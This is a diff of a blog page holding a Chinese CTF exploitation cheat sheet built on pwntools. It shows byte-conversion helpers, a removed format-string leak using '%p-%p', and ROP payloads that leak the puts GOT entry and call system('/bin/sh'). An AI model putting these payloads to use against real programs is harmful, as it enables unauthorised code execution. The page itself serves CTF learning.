@@ -447,15 +447,6 @@
                 </div>
                 <div class="col s5 right-align">
                     
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E6%80%BB%E7%BB%93/" class="post-category">
-                                总结
-                            </a>
-                        
-                    </div>
-                    
                 </div>
             </div>
 
@@ -477,7 +468,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    712
+                    731
                 </div>
                 
 
@@ -500,7 +491,8 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="脚本的开始"><a href="#脚本的开始" class="headerlink" title="脚本的开始"></a>脚本的开始</h3><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605108280066.png" alt="大纲图"></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 file_path <span class="token operator">=</span> <span class="token string">"./RHVM.bin"</span>
 context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
 context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
@@ -534,50 +526,45 @@ debug <span class="token operator">=</span> <span class="token number">1</span>
         gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
 
 debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000000117C</span><span class="token punctuation">,</span><span class="token number">0x00000000000011B8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
-<h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><h3 id="用来泄露堆里面的地址-待改进为可以泄露两个"><a href="#用来泄露堆里面的地址-待改进为可以泄露两个" class="headerlink" title="用来泄露堆里面的地址(待改进为可以泄露两个)"></a>用来泄露堆里面的地址(待改进为可以泄露两个)</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak_result</span><span class="token punctuation">(</span>until<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>until<span class="token punctuation">)</span>
-    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
-    result<span class="token operator">=</span>u64<span class="token punctuation">(</span>info<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> result
+<h2 id="字节转化"><a href="#字节转化" class="headerlink" title="字节转化"></a>字节转化</h2><h3 id="比特流转int-（0a-21-54–-gt-”0x54210a”）"><a href="#比特流转int-（0a-21-54–-gt-”0x54210a”）" class="headerlink" title="比特流转int （0a 21 54–&gt;”0x54210a”）"></a>比特流转int （0a 21 54–&gt;”0x54210a”）</h3><pre class=" language-python"><code class="language-python">p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>until<span class="token punctuation">)</span>
+info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#比特流转int</span>
+result<span class="token operator">=</span>u64<span class="token punctuation">(</span>info<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak bit to int : "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
+result</code></pre>
+<h3 id="字符串转int（”0x5060a0”–-gt-0x5060a0）"><a href="#字符串转int（”0x5060a0”–-gt-0x5060a0）" class="headerlink" title="字符串转int（”0x5060a0”–&gt;0x5060a0）"></a>字符串转int（”0x5060a0”–&gt;0x5060a0）</h3><pre class=" language-python"><code class="language-python">p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span>，drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#12是64位libc地址的长度  16是64位canary的长度 (不算0x) </span>
+result<span class="token operator">=</span>int16<span class="token punctuation">(</span>info<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak str to int : "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
+result</code></pre>
+<h3 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#从fro到to进行移位操作,索引从0开始</span>
 
-new_node<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x61</span><span class="token punctuation">)</span>
-new_node<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x61</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">left</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>item<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffffffffffff</span>
+<span class="token keyword">def</span> <span class="token function">yiwei</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span>fro<span class="token punctuation">,</span>to<span class="token punctuation">,</span>bit<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
+        fro_bit<span class="token operator">=</span><span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span> <span class="token comment" spellcheck="true">#取出来第fro位</span>
+        fro_bit_8<span class="token operator">=</span>fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把fro位复制到其他位</span>
+        result<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fro_bit_8 <span class="token comment" spellcheck="true">#删除多余的</span>
+        <span class="token comment" spellcheck="true"># print("result:",hex(to))</span>
+        <span class="token keyword">return</span> result
+    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
+        fro_bit <span class="token operator">=</span> <span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>  <span class="token comment" spellcheck="true"># 取出来第fro位</span>
+        fro_bit_8 <span class="token operator">=</span> fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 把fro位复制到其他位</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> fro_bit_8  <span class="token comment" spellcheck="true"># 删除多余的</span>
 
-delete_node<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-delete_node<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-show_node<span class="token punctuation">(</span><span class="token punctuation">)</span>
-leak_result<span class="token punctuation">(</span><span class="token string">"index 1:"</span><span class="token punctuation">)</span></code></pre>
-<h3 id="泄露格式化字符串-可以同时泄露多个-因为里面直接用recv-会一下接收全部的回应可能会让下一次new阻塞"><a href="#泄露格式化字符串-可以同时泄露多个-因为里面直接用recv-会一下接收全部的回应可能会让下一次new阻塞" class="headerlink" title="泄露格式化字符串(可以同时泄露多个),因为里面直接用recv()会一下接收全部的回应可能会让下一次new阻塞"></a>泄露格式化字符串(可以同时泄露多个),因为里面直接用recv()会一下接收全部的回应可能会让下一次new阻塞</h3><p>输入的payload为%p%p格式</p>
-<ul>
-<li>spli为要进行切割的字符串</li>
-<li>length为要每一段要保留的长度(如果是libc的地址6个字节,需要的长度为12)</li>
-<li>需要先查看输出再决定保留哪一部分</li>
-</ul>
-<pre class=" language-python"><code class="language-python">
-<span class="token comment" spellcheck="true"># 列表字符串转int,包含一个输出</span>
-<span class="token keyword">def</span> <span class="token function">get_int</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    content<span class="token operator">=</span><span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>
-    out<span class="token operator">=</span><span class="token punctuation">[</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"content to int end is : "</span><span class="token punctuation">,</span>out<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> content
+decoding<span class="token operator">=</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>
+<h3 id="字符串和16进制数之间的转化"><a href="#字符串和16进制数之间的转化" class="headerlink" title="字符串和16进制数之间的转化"></a>字符串和16进制数之间的转化</h3><pre class=" language-c"><code class="language-c">import binascii
+def <span class="token function">hex2char</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+   <span class="token macro property"># binascii.a2b_hex(hexstr)</span>
+    output <span class="token operator">=</span> binascii<span class="token punctuation">.</span><span class="token function">unhexlify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token function">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
 
-<span class="token keyword">def</span> <span class="token function">get_formate_result</span><span class="token punctuation">(</span>spli<span class="token operator">=</span><span class="token string">"0x"</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    info<span class="token operator">=</span>info<span class="token punctuation">.</span>split<span class="token punctuation">(</span>spli<span class="token punctuation">)</span>
-    info<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>length<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> info<span class="token punctuation">]</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak info (may set a and b to get real info) : "</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> info
-
-send_name<span class="token punctuation">(</span><span class="token string">"%p-%p"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#中间长度不够12的元素将会被舍弃</span>
-show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
-info<span class="token operator">=</span>get_formate_result<span class="token punctuation">(</span><span class="token punctuation">)</span>
-info<span class="token operator">=</span>get_int<span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-输出结果为
-<span class="token punctuation">(</span><span class="token string">'leak info (may set a and b to get real info) : '</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'Current user'</span><span class="token punctuation">,</span> <span class="token string">'7ffc95a046f0'</span><span class="token punctuation">,</span> <span class="token string">'7f409df8a780'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token punctuation">(</span><span class="token string">'content to int end is : '</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'0x7ffc95a046f0'</span><span class="token punctuation">,</span> <span class="token string">'0x7f409df8a780'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-</code></pre>
+def <span class="token function">char2hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    output<span class="token operator">=</span>binascii<span class="token punctuation">.</span><span class="token function">b2a_hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token macro property"># output = binascii.hexlify(data)</span>
+    <span class="token function">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
+<span class="token function">hex2char</span><span class="token punctuation">(</span><span class="token string">"2f62696e2f736800"</span><span class="token punctuation">)</span> #<span class="token operator">/</span>bin<span class="token operator">/</span>sh
+<span class="token function">char2hex</span><span class="token punctuation">(</span><span class="token string">"/bin"</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token punctuation">)</span>#2f62696e2f736800</code></pre>
 <h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><h3 id="常用rop-待添加如ret2dl的-栈迁移的等"><a href="#常用rop-待添加如ret2dl的-栈迁移的等" class="headerlink" title="常用rop(待添加如ret2dl的,栈迁移的等)"></a>常用rop(待添加如ret2dl的,栈迁移的等)</h3><h4 id="泄露puts函数got表"><a href="#泄露puts函数got表" class="headerlink" title="泄露puts函数got表"></a>泄露puts函数got表</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>下一次返回的地址<span class="token punctuation">)</span></code></pre>
 <h4 id="调用system-“-bin-sh”"><a href="#调用system-“-bin-sh”" class="headerlink" title="调用system(“/bin/sh”)"></a>调用system(“/bin/sh”)</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
 <h2 id="计算方法"><a href="#计算方法" class="headerlink" title="计算方法"></a>计算方法</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>泄露-目的=偏移——&gt;目的=泄露-偏移<br>例:</p>
@@ -736,12 +723,12 @@ AX 通用寄存器,用来存放指令执行后的结果
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/wp/">
-                        <span class="chip bg-color">wp</span>
-                    </a>
-                    
                     <a href="/tags/ctf/">
                         <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
                     </a>
                     
                 </div>
@@ -790,12 +777,12 @@ c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/wp/">
-                        <span class="chip bg-color">wp</span>
-                    </a>
-                    
                     <a href="/tags/ctf/">
                         <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
                     </a>
                     
                 </div>
@@ -948,7 +935,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7.4k</span>&nbsp;字
+                class="white-color">7.5k</span>&nbsp;字
             
             
             
